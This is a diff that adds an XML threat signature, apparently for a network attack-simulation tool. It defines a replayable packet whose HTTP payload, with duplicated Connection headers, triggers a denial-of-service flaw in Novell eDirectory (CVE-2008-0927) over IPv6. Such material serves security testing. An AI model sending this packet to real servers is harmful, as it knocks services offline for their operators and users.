@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Novell eDirectory HTTP Headers Denial of Service (IPv6 Version)"/>
+    <EngDesc display="true" value="A resource exhaustion vulnerability exists in Novell eDirectory. The vulnerability can be triggered by a crafted HTTP request. A remote unauthenticated attacker can create a denial of service condition on the affected service by leveraging this vulnerability. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="RESOURCE_EXHAUSTION"/>
+    </Intent>
+    <Protocol display="true" value="HTTP-ALT/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Novell"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Novell_Novell_eDirectory"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="FSC20080402-06"/>
+    <CVEID display="true" value="CVE-2008-0927"/>
+    <bugtraqID display="true" value="28757"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="cb81d007f89eccd4a63a0d3b00b12e1a"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="not-required"/>
+    <IntegImpact display="false" value="not-required"/>
+    <AvailImpact display="false" value="Partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1225900850"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1221854861" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="H"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="I"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="J"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="K"/>
+    <NamedVar name="HTTPALTdestPort" type="ImperfectControls.Port" value="null" index="L"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+      <for index="L"/>
+    </for>
+    <for index="A"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPALTdestPort" SeqNumber="F4E1BF1B" AckNumber="93CD3DC7" HeaderLength="08" WindowSize="05B4" Checksum="5DC5" UrgentPointer="0000" Options="0101080A971B4AC600000000" Payload="474554202F20485454502F312E300D0A436F6E6E656374696F6E3A206161610D0A436F6E6E656374696F6E3A206262620D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="A" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="A3A73C08" AckNumber="7D0CEDCF" HeaderLength="08" WindowSize="F922" Checksum="6124" UrgentPointer="0000" Options="0101080A0000FFD70087EF97" Payload="20" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
